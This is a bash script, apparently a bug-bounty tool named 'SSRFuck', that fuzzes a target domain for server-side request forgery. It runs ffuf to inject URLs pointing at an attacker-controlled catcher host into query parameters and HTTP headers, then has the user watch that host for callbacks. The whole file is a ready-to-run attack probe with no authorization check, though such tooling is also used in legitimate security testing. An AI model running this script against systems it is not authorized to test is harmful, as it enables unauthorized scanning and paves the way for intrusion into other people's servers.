#!/usr/bin/env bash

DOMAIN=$1

# Usually your Burp collaborator (without the http/s schema.)
SSRF_CATCHER=$2

# Get the "clean" domain without the schema. This will be used for the ffuf output file name.
DOMAIN_CLEAN=`echo ${DOMAIN} | sed -e 's|^[^/]*//||' -e 's|/.*$||' -e 's/:[0-9]*$//'`

# Cause every bash script needs a banner :D
banner() {
    echo -en "\033[31m"
	
	cat << "EOF"


 _____ _________________          _    
/  ___/  ___| ___ \  ___|        | |   
\ `--.\ `--.| |_/ / |_ _   _  ___| | __
 `--. \`--. \    /|  _| | | |/ __| |/ /
/\__/ /\__/ / |\ \| | | |_| | (__|   < 
\____/\____/\_| \_\_|  \__,_|\___|_|\_\
                                       

	# By 2RS3C (https://twitter.com/2RS3C)
EOF

	echo -en "\033[0m"
}

fuzz_params() {
	ffuf -w parameters.txt -u "${DOMAIN}?FUZZ=https:%2F%2FFUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -timeout 3 -o ./ffuf-output/${DOMAIN_CLEAN}-parameters.json >> /dev/null 2>&1
}

fuzz_headers() {
	ffuf -w headers.txt -u "${DOMAIN}" -H "FUZZ: http://FUZZ-${DOMAIN_CLEAN}.${SSRF_CATCHER}" -timeout 3 -o ./ffuf-output/${DOMAIN_CLEAN}-headers.json >> /dev/null 2>&1
}

####### Start #######

banner

echo "[-] Fuzzing parameters in ${DOMAIN}."
fuzz_params

echo "[-] Fuzzing headers in ${DOMAIN}."
fuzz_headers

echo "[+] Done fuzzing in ${DOMAIN}."
echo "[+] Check for requests on your server (${SSRF_CATCHER})."
